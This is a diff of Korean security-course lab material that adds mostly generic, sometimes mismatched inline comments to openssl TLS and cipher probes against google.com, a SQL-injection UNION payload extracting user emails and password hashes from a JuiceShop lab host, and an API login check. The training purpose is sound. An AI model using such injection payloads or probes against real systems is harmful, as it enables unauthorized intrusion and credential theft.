@@ -215,7 +215,7 @@ echo | openssl s_client -connect www.google.com:443 -servername www.google.com 2
 
 ```bash
 # 인증서 종합 점검 스크립트 (HTTPS 지원 사이트 대상)
-python3 << 'PYEOF'
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 import subprocess, re, sys
 from datetime import datetime
 
@@ -298,7 +298,7 @@ echo ""
 echo "=== 약한 암호 스위트 개별 테스트 ==="
 
 WEAK_CIPHERS=("RC4" "DES" "3DES" "NULL" "EXPORT" "MD5")
-for cipher in "${WEAK_CIPHERS[@]}"; do
+for cipher in "${WEAK_CIPHERS[@]}"; do                 # 반복문 시작
   result=$(echo | openssl s_client -connect www.google.com:443 -cipher "$cipher" 2>&1 | head -1)
   if echo "$result" | grep -q "CONNECTED"; then
     echo "[취약] $cipher 지원됨!"
@@ -314,7 +314,7 @@ done
 # 각 TLS 버전 지원 여부 확인
 echo "=== TLS 버전 지원 확인 (google.com) ==="
 
-for version in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
+for version in ssl3 tls1 tls1_1 tls1_2 tls1_3; do      # 반복문 시작
   result=$(echo | openssl s_client -connect www.google.com:443 -$version 2>&1 | grep "Protocol")
   if echo "$result" | grep -qi "protocol"; then
     echo "[지원] $version: $result"
@@ -333,11 +333,11 @@ done 2>/dev/null
 ```bash
 # JuiceShop 사용자 비밀번호 해시 확인
 # SQLi로 해시 추출 (Week 05에서 학습)
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+3--" | python3 -c "
+curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+3--" | python3 -c "  # silent 모드
 import sys, json
 try:
     data = json.load(sys.stdin).get('data', [])
-    for item in data:
+    for item in data:                                  # 반복문 시작
         name = str(item.get('name', ''))
         desc = str(item.get('description', ''))
         if '@' in name:
@@ -375,17 +375,17 @@ echo ""
 echo "=== API 응답 민감 정보 확인 ==="
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # 로그인 응답에 비밀번호 해시가 포함되는지
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "  # 요청 데이터(body)
 import sys, json
 data = json.load(sys.stdin)
 auth = data.get('authentication', {})
 print('로그인 응답 필드:')
-for key in auth.keys():
+for key in auth.keys():                                # 반복문 시작
     val = str(auth[key])
     if key == 'token':
         val = val[:30] + '...'
